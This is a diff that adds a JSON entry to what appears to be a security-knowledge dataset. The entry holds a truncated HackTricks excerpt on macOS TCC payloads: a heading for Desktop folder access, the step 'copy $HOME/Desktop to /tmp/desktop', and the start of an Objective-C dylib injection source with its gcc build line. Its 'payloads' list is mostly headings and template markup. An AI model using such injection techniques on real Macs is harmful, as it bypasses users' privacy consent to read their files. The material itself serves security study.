@@ -1,0 +1,27 @@
+{
+  "id": "macos_hardening_2312681ad5dd",
+  "category": "macos-hardening",
+  "title": "macos tcc payloads",
+  "description": "# macOS TCC Payloads\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\n### Desktop\n\n- **Entitlement**: None\n- **TCC**: kTCCServiceSystemPolicyDesktopFolder\n\n{{#tabs}}\n{{#tab name=\"ObjetiveC\"}}\nCopy `$HOME/Desktop` to `/tmp/desktop`.\n\n```objectivec\n#include <syslog.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n#import <Foundation/Foundation.h>\n\n// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m\n\n__attribute__((constructor))\nvoid myconstructor(int a",
+  "payloads": [
+    "# macOS TCC Payloads",
+    "{{#include ../../../../banners/hacktricks-training.md}}",
+    "### Desktop",
+    "- **Entitlement**: None",
+    "- **TCC**: kTCCServiceSystemPolicyDesktopFolder",
+    "{{#tabs}}",
+    "{{#tab name=\"ObjetiveC\"}}",
+    "Copy `$HOME/Desktop` to `/tmp/desktop`.",
+    "```objectivec",
+    "#include <syslog.h>",
+    "#include <stdio.h>",
+    "#include <unistd.h>",
+    "#include <stdlib.h>",
+    "#import <Foundation/Foundation.h>",
+    "// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-payloads.md"
+  ]
+}
